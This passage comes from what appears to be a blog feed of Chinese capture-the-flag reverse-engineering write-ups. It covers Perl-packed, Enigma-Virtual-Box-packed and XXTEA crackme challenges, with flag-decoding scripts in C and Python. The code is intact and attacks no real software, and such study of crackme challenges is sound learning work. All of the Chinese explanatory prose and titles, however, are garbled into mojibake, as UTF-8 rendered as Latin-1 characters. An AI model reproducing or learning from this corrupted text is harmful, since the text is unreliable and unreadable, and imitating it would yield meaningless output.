class="number">0x4E</span>, <span class="number">0x78</span>, <span class="number">0x22</span>,</span><br><span class="line">  <span class="number">0x1B</span>, <span class="number">0x0B</span>]</span><br><span class="line">xor = [<span class="number">0x49</span>, <span class="number">0x4C</span>, <span class="number">0x6F</span>, <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0x53</span>,</span><br><span class="line">       <span class="number">0x68</span>, <span class="number">0x31</span>, <span class="number">0x4E</span>, <span class="number">0x30</span>, <span class="number">0x3F</span>, <span class="number">0x21</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">52</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(enc[i] ^ xor[i%<span class="number">12</span>])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€perlã€‘ã€buuã€‘[WMCTF2020]easy_re</title>
      <link href="/2024/08/04/%E3%80%90perl%E3%80%91%E3%80%90buu%E3%80%91%5BWMCTF2020%5Deasy_re/"/>
      <url>/2024/08/04/%E3%80%90perl%E3%80%91%E3%80%90buu%E3%80%91%5BWMCTF2020%5Deasy_re/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€perlã€‘ã€buuã€‘-WMCTF2020-easy-re"><a href="#ã€perlã€‘ã€buuã€‘-WMCTF2020-easy-re" class="headerlink" title="ã€perlã€‘ã€buuã€‘[WMCTF2020]easy_re"></a>ã€perlã€‘ã€buuã€‘[WMCTF2020]easy_re</h1><hr><p>ä¹Ÿæ˜¯å­¦åˆ°æ–°çš„ä¸œè¥¿äº†</p><hr><p>è¿™é¢˜ç»è¿‡perlåŠ å¯†è¿‡çš„</p><p>æŸ¥å…‹æ— å£³64ä½ ida</p><p>æ‰¾äº†åŠå¤©æ²¡æ‰¾åˆ°ä¸€ç‚¹æœ‰ç”¨çš„ä¸œè¥¿ï¼Œå€’æ˜¯æœ‰å‡ ä¸ªå¥‡æ€ªå­—ç¬¦</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BWMCTF2020%5Deasy_re/strang_string.png" alt="strang_string"></p><p>åæ¥çœ‹äº†ä¸€ä¸‹å…¶ä»–äººçš„wpå‘ç°åœ¨å­—ç¬¦ä¸²ä¸æ–­å‡ºç°çš„perlæ˜¯ä¸ªæç¤º</p><hr><h2 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h2><p>ã€çœ‹é›ªperlä¾‹é¢˜ã€‘<a href="https://bbs.kanxue.com/thread-67651.htm">https://bbs.kanxue.com/thread-67651.htm</a></p><p>00405276 |. 83C4 0C    |add   esp, 0C<br>00405279 |. 8945 F0    |mov   dword ptr [ebp-10], eax<br>0040527C |. 85C0      |test  eax, eax<br>0040527E |. 0F84 83000000 |je    00405307<br>00405284 |. 68 5CCF4000  |push  0040CF5C                ; ASCII â€œscriptâ€<br>00405289 |. 50        |push  eax<br>0040528A |. 8B03      |mov   eax, dword ptr [ebx]<br>0040528C |. FF30      |push  dword ptr [eax]<br>0040528E |. E8 CBEFFFFF  |call  0040425E<br>00405293 |. 83C4 0C    |add   esp, 0C<br>00405296 |. 8943 24    |mov   dword ptr [ebx+24], eax<br>00405299 |. 85C0      |test  eax, eax<br>0040529B |. 0F84 32020000 |je    004054D3<br>004052A1 |. 68 50CF4000  |push  0040CF50                   ; &#x2F;s &#x3D; â€œhashlineâ€<br>004052A6 |. FF75 F0    |push  dword ptr [ebp-10]          ; |&#x2F;s<br>004052A9 |. E8 38360000  |call  &lt;jmp.&amp;MSVCRT.strlen&gt;          ; |\strlen<br>004052AE |. 8BD8      |mov   ebx, eax                   ; |<br>004052B0 |. C70424 40CF40&gt;|mov   dword ptr [esp], 0040CF40    ; |ASCII â€œ-e#line 1 â€œâ€%sâ€â€â€<br>004052B7 |. E8 2A360000  |call  &lt;jmp.&amp;MSVCRT.strlen&gt;          ; \strlen<br>004052BC |. 59        |pop   ecx<br>004052BD |. 03D8      |add   ebx, eax<br>004052BF |. 53        |push  ebx<br>004052C0 |. E8 46EEFFFF  |call  0040410B</p><p>è¿™ä¸ªåœ°æ–¹0040528E call  0040425E å°±æ˜¯è§£å‹çš„è¿‡ç¨‹ï¼Œç›´æ¥f8è¿‡äº†ä»¥åeaxé‡Œé¢å°±æ˜¯ä½ çš„æºä»£ç äº†ã€‚</p><p>ã€perlç®€å•ä»‹ç»ã€‘<a href="https://www.bilibili.com/video/BV1qB4y1G7B3/?spm_id_from=333.880.my_history.page.click&vd_source=1c1b392be21faf2076e99a04a9cb6b82">https://www.bilibili.com/video/BV1qB4y1G7B3/?spm_id_from=333.880.my_history.page.click&amp;vd_source=1c1b392be21faf2076e99a04a9cb6b82</a></p><p>perlæ˜¯è§£é‡Šè¯­è¨€ï¼Œperlappåªæ˜¯æŠŠä½ çš„perlç¨‹åºå‹ç¼©åæ”¾åœ¨èµ„æºé‡Œé¢ï¼Œæ‰§è¡Œçš„æ—¶å€™ä¼šè§£å‹çš„ã€‚</p><hr><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>åœ¨idaé‡ŒåŠ¨è°ƒæ‰¾å¤ªåç‰¢äº†æ‰€ä»¥é€‰æ‹©è¡Œx64dbg</p><p>F8å•æ­¥ä¸€ç›´åˆ°è¿›å…¥ä¸»å‡½æ•°</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BWMCTF2020%5Deasy_re/main.png" alt="main"></p><hr><p>è¿›å…¥ä¸»å‡½æ•°åè¿›è¡Œæœç´¢script</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BWMCTF2020%5Deasy_re/search.png" alt="search"></p><hr><p>è·Ÿè¿›ååœ¨è¿™é‡Œæ‰“æ–­ç‚¹</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BWMCTF2020%5Deasy_re/break.png" alt="break"></p><hr><p>å¼€å§‹å•æ­¥è°ƒè¯•</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BWMCTF2020%5Deasy_re/flag.png" alt="flag"></p><p>flagè¢«è§£å¯†å‡ºæ¥</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€virtualboxã€‘ã€buuã€‘ [GKCTF 2021]QQQQT</title>
      <link href="/2024/08/02/%5BGKCTF%202021%5DQQQQT/"/>
      <url>/2024/08/02/%5BGKCTF%202021%5DQQQQT/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€buuã€‘-GKCTF-2021-QQQQT"><a href="#ã€buuã€‘-GKCTF-2021-QQQQT" class="headerlink" title="ã€buuã€‘ [GKCTF 2021]QQQQT"></a>ã€buuã€‘ [GKCTF 2021]QQQQT</h1><hr><p>è¿™é¢˜å§ï¼Œä¸éš¾ï¼Œä¸»è¦æ˜¯ç”¨exeinfopeå…‰çœ‹æ˜¯ä¸æ˜¯upxåŠ å£³æ²¡ä»”ç»†çœ‹ä¸‹é¢çš„virtualboxäº†</p><hr><p>æŸ¥å£³</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/QQQQT/check_package.png" alt="check_package"></p><p>çœ‹epæ˜¯.textå®é™…ä¸Šè¿™æ˜¯ä¸ª Virtual BoxåŠ å£³</p><p>å»æ‰¾å·¥å…·EnigmaVBUnpackerè„±å£³</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/QQQQT/unpackage.png" alt="unpackage"></p><p>è„±å£³åä¼šåœ¨æ–‡ä»¶æ‰€åœ¨çš„æ–‡ä»¶å¤¹ä¸­æ–°ç”ŸæˆQQQQT_unpacked.exe</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/QQQQT/unpacked.png" alt="unpacked"></p><hr><p>ç”¨idaæ‰“å¼€QQQQT_unpacked.exe</p><p>é€šè¿‡stringæ‰¾åˆ°å¯†æ–‡</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/QQQQT/string.png" alt="string"></p><hr><p>è·Ÿè¿›</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/QQQQT/base58.png" alt="base58"></p><p>ç–‘ä¼¼æ˜¯base58</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/QQQQT/flag.png" alt="flag"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€buuã€‘ã€å¦ä¸€ç§æŠ½è±¡çš„xxteaã€‘[2019çº¢å¸½æ¯]xx</title>
      <link href="/2024/07/31/%E3%80%90buu%E3%80%91%E3%80%90%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%8A%BD%E8%B1%A1%E7%9A%84xxtea%E3%80%91%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5Dxx/"/>
      <url>/2024/07/31/%E3%80%90buu%E3%80%91%E3%80%90%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%8A%BD%E8%B1%A1%E7%9A%84xxtea%E3%80%91%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5Dxx/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€buuã€‘ã€å¦ä¸€ç§æŠ½è±¡çš„xxteaã€‘-2019çº¢å¸½æ¯-xx"><a href="#ã€buuã€‘ã€å¦ä¸€ç§æŠ½è±¡çš„xxteaã€‘-2019çº¢å¸½æ¯-xx" class="headerlink" title="ã€buuã€‘ã€å¦ä¸€ç§æŠ½è±¡çš„xxteaã€‘[2019çº¢å¸½æ¯]xx"></a>ã€buuã€‘ã€å¦ä¸€ç§æŠ½è±¡çš„xxteaã€‘[2019çº¢å¸½æ¯]xx</h1><p>bé¢˜çœ‹äº†ä¸€æ•´å¤©ï¼Œæ€»ç®—æ˜¯çœ‹æ˜ç™½äº†TMD</p><hr><p>æŸ¥å…‹æ— å£³64ä½ï¼Œæ‹–å…¥ida</p><p>å‘ç°ä¸€å¾ˆå¤§ä¸€å¨ä»£ç ï¼Œæ…¢æ…¢åˆ†æå§</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5Dxx/put_in.png" alt="put_in"></p><p>æœ‰ä¸ªè¾“å…¥å‡½æ•°å’Œv6</p><p>è¿™é‡Œçš„v6åé¢çš„Codeä¸æ˜¯ä¸Šé¢è¦è¾“å…¥Codeï¼Œè·Ÿè¿›å‘ç°æ˜¯å¦å¤–çš„ä¸€ä¸²å­—ç¬¦</p><hr><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5Dxx/check.png" alt="check"></p><p>è¿™é‡Œä¹Ÿæ˜¯è¦åæ§½ç…ç¬”idaä¼ªä»£ç çš„åç¼–è¯‘çš„è¡¨è¾¾å½¢å¼</p><p>*(v9 + Code - v5)è¡¨ç¤ºçš„code[v9-v5]</p><p>è¿™v13æ˜¯æ£€æµ‹v6çš„é•¿åº¦</p><p>ifè¯­å¥æ˜¯éå†æ£€æµ‹è¾“å…¥çš„å­—ç¬¦æ˜¯å¦åœ¨v6çš„èŒƒå›´å†…ï¼Œæ˜¯çš„è¯å°±è·³å‡ºå¾ªç¯ï¼Œ</p><p>å¦‚æœæœ‰ä¸å±äºv6çš„å­—ç¬¦å­˜åœ¨v11å°±ä¼šç´¯åŠ åˆ°36</p><p>v14è¿™ä¸€å°æ®µä¹Ÿæ˜¯æ£€æµ‹v6é•¿åº¦</p><p>å½“æœ‰ä¸å±äºv6çš„å­—ç¬¦å­˜åœ¨æ—¶å°±ä¼šé€€å‡º</p><p>v9 - v5 &lt; 4è¡¨è¾¾çš„æ˜¯è¿™ä¸€æ®µä»£ç åªæˆªå–è¾“å…¥çš„å‰å››ä¸ªå­—ç¬¦</p><hr><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5Dxx/check2.png" alt="check2"></p><p>è¿™é‡Œv3æé”™äº†åº”è¯¥æ˜¯19ï¼Œè¿™é‡Œçš„codeæ˜¯è¾“å…¥</p><p>v30åŠ¨è°ƒå‡ºæ¥çš„æ˜¯è¾“å…¥çš„flagçš„å‰å››ä¸ªå­—ç¬¦</p><p>ä¸‹é¢çš„è¿ç»­çš„4ä¸ª <strong>if</strong> è¡¨æ˜å‰å››ä¸ªå­—ç¬¦ä¸èƒ½æ˜¯0</p><hr><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5Dxx/key_exbend%26xxtea%26mix.png" alt="key_exbend&amp;xxtea&amp;mix"></p><p>é¦–å…ˆè¿™ä¸ªå¾ªç¯æ˜¯ä¸€ä¸ªå¯†é’¥æ‰©å±•ï¼Œæ˜¯æŠŠè¾“å…¥çš„flagå‰å››ä¸ªå­—æ¯æ‰©å±•æˆ16ä½ï¼Œä¹Ÿå°±æ˜¯4ä¸ª4ä½çš„å¯†é’¥</p><p>ç„¶åå†…ä¸ªsub_7FF7ADD11AB0æ˜¯æ¯”è¾ƒæŠ½è±¡çš„xxteaåŠ å¯†ï¼Œå…·ä½“æ˜¯ç”¨ä¸€ä¸ªæ’ä»¶<strong>FindCrypt</strong>å’Œç»“åˆé¢˜ç›®çŒœæµ‹å¯èƒ½æ˜¯xxtea</p><p>Sizeæ˜¯åŠ¨è°ƒå‡ºæ¥çš„æ˜¯ä¸ªå›ºå®šå€¼24</p><p>ç„¶åå°±æ˜¯è¿›è¡Œä½ç½®äº¤æ¢æ··æ·†</p><hr><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5Dxx/xor%26enc.png" alt="xor&amp;enc"></p><p>è¿™é‡Œçš„å¼‚æˆ–æœ€å¼€å§‹æ²¡çœ‹æ‡‚</p><p>é¦–å…ˆæ˜¯è¿™ä¸ª++v22è¿™ä¸ªv22å¯ä»¥è®¤ä¸ºæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œ++v22æ˜¯æŒ‡å‘æ•°ç»„çš„åä¸€ä¸ªå…ƒç´ </p><p>ç„¶åé‡Œé¢çš„ifè¯­å¥è¡¨ç¤ºè¦ä»3å¼€å§‹å¼‚æˆ–ï¼Œæ‰€ä»¥å‰ä¸‰ä¸ªï¼ˆ0-2ï¼‰å…ƒç´ ä¸ä¼šè¿›è¡Œæ“ä½œ</p><p>å½“ä»3å¼€å§‹ä¼šè¿›è¡Œå¼‚æˆ–ï¼ŒæŠŠ<strong>å½“å‰çš„v22çš„å€¼</strong>ä¸<strong>ä»0ä½ç½®å¼€å§‹çš„v20</strong>è¿›è¡Œå¼‚æˆ–</p><p>æ¯ä¸‰ä¸ªå…ƒç´ ä¸ºä¸€ç»„ï¼Œæ¯ç»„æ¯”ä¸Šä¸€ç»„å¤šè¿›è¡Œä¸€æ¬¡å¼‚æˆ–ï¼Œ</p><p>å¤šè¿›è¡Œçš„é‚£ä¸€æ¬¡å¼‚æˆ–ï¼Œæ˜¯å°†<strong>åˆšæ‰å¼‚æˆ–å¾—åˆ°çš„å€¼</strong>ä¸**v20[ï¼ˆåˆšæ‰å¾—å€¼+1ï¼‰]**è¿›è¡Œå¼‚æˆ–</p><p>ä¸€ç›´åˆ°v21 &#x3D;  23è¿›è¡Œæœ€åä¸€æ¬¡å¾ªç¯</p><p>v30 v30[1] v31 v32æ˜¯å¯†æ–‡ã€‚ä½†æ˜¯è¦æ³¨æ„å°ç«¯åºï¼Œå»ºè®®åŠ¨è°ƒè°ƒåˆ°è¿™é‡Œç›´æ¥æå–</p><hr><p>ç»¼ä¸Šæˆ‘ä»¬å…ˆæŠŠæ¢ä½æ··æ·†çš„å¯†æ–‡å’Œè¿­ä»£å¼‚æˆ–å…ˆç»™è§£å›å»</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> mix[] = &#123; <span class="number">0xCE</span>, <span class="number">0xBC</span>, <span class="number">0x40</span>, <span class="number">0x6B</span>, <span class="number">0x7C</span>, <span class="number">0x3A</span>, <span class="number">0x95</span>, <span class="number">0xC0</span>, <span class="number">0xEF</span>, <span class="number">0x9B</span>, </span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x91</span>, <span class="number">0xF7</span>, <span class="number">0x02</span>, <span class="number">0x35</span>, <span class="number">0x23</span>, <span class="number">0x18</span>, <span class="number">0x02</span>, <span class="number">0xC8</span>, </span><br><span class="line">  <span class="number">0xE7</span>, <span class="number">0x56</span>, <span class="number">0x56</span>, <span class="number">0xFA</span>&#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> enc[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">23</span>; i &gt;=<span class="number">3</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">6</span>-count; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line">mix[i]^=mix[j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">3</span> == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">  enc[<span class="number">2</span>] = mix[<span class="number">0</span>];</span><br><span class="line">enc[<span class="number">0</span>] = mix[<span class="number">1</span>];</span><br><span class="line">enc[<span class="number">3</span>] = mix[<span class="number">2</span>];</span><br><span class="line">enc[<span class="number">1</span>] = mix[<span class="number">3</span>];</span><br><span class="line">enc[<span class="number">6</span>] = mix[<span class="number">4</span>];</span><br><span class="line">enc[<span class="number">4</span>] = mix[<span class="number">5</span>];</span><br><span class="line">enc[<span class="number">7</span>] = mix[<span class="number">6</span>];</span><br><span class="line">enc[<span class="number">5</span>] = mix[<span class="number">7</span>];</span><br><span class="line">enc[<span class="number">10</span>] = mix[<span class="number">8</span>];</span><br><span class="line">enc[<span class="number">8</span>] = mix[<span class="number">9</span>];</span><br><span class="line">enc[<span class="number">11</span>] = mix[<span class="number">10</span>];</span><br><span class="line">enc[<span class="number">9</span>] = mix[<span class="number">11</span>];</span><br><span class="line">enc[<span class="number">14</span>] = mix[<span class="number">12</span>];</span><br><span class="line">enc[<span class="number">12</span>] = mix[<span class="number">13</span>];</span><br><span class="line">enc[<span class="number">15</span>] = mix[<span class="number">14</span>];</span><br><span class="line">enc[<span class="number">13</span>] = mix[<span class="number">15</span>];</span><br><span class="line">enc[<span class="number">18</span>] = mix[<span class="number">16</span>];</span><br><span class="line">enc[<span class="number">16</span>] = mix[<span class="number">17</span>];</span><br><span class="line">enc[<span class="number">19</span>] = mix[<span class="number">18</span>];</span><br><span class="line">enc[<span class="number">17</span>] = mix[<span class="number">19</span>];</span><br><span class="line">enc[<span class="number">22</span>] = mix[<span class="number">20</span>];</span><br><span class="line">enc[<span class="number">20</span>] = mix[<span class="number">21</span>];</span><br><span class="line">enc[<span class="number">23</span>] = mix[<span class="number">22</span>];</span><br><span class="line">enc[<span class="number">21</span>] = mix[<span class="number">23</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, enc[i]);</span><br><span class="line">  </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå†æ‰¾ä¸€ä¸ªxxteaè„šæœ¬è¿›è¡Œè§£å¯†</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;<span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;<span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">6</span>]= &#123;<span class="number">0x40cea5bc</span>,<span class="number">0xe7b2b2f4</span>,<span class="number">0x129d12a9</span>,<span class="number">0x5bc810ae</span>,<span class="number">0x1d06d73d</span>,<span class="number">0xdcf870dc</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]= &#123;(<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">0x67616c66</span>,(<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">0x0</span>,(<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">0x0</span>,(<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">0x0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">6</span>;</span><br><span class="line">    <span class="built_in">btea</span>(v, -n, k);</span><br><span class="line"><span class="comment">//    printf(&quot;è§£å¯†åçš„æ•°æ®ï¼š%x %x %x %x %x %x\n&quot;, v[0], v[1],v[2],v[3],v[4],v[5]);</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;<span class="number">6</span> ; i++)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,v[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠçš„å‡ºæ¥çš„16è¿›åˆ¶è½¬æ¢æˆå­—ç¬¦ï¼Œæ³¨æ„å°ç«¯åº</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€buuã€‘[GXYCTF2019]simple CPP</title>
      <link href="/2024/07/30/%E3%80%90buu%E3%80%91%5BGXYCTF2019%5Dsimple%20CPP/"/>
      <url>/2024/07/30/%E3%80%90buu%E3%80%91%5BGXYCTF2019%5Dsimple%20CPP/</url>
      
